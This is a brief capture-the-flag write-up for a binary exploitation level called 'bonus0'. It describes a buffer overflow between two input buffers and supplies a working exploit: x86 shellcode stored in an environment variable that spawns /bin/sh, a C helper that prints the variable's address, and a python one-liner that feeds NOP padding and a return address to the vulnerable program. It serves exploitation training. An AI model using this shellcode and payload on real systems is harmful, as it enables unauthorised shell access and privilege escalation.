# bonus 0

In this level, we have an executable which can take two different values, after a certain point, the second parameter overflow in the first one and if we fill too much both variables, it produces a segfault

With gdb or any other tool such as ghidra, cutter etc, we can see that the buffer of the first variable is 4096. The idea will be to go at the end of this buffer and inject our shellcode

```bash
export SHELLCODE=$(python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

We will fill the buffer with some NOP and inject the address of our shellcode

here we have a little program to get the address of our shellcode:

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
  printf("env address at %p\n", getenv(argv[1]));
  return (0);
}
```

```bash
(python -c "print('\x90' * 4095 + '\n' + '\x90' * 9 + '\xbf\xff\xf8\xe9'[::-1]) + '\x90' * 7"; cat) | ./bonus0
```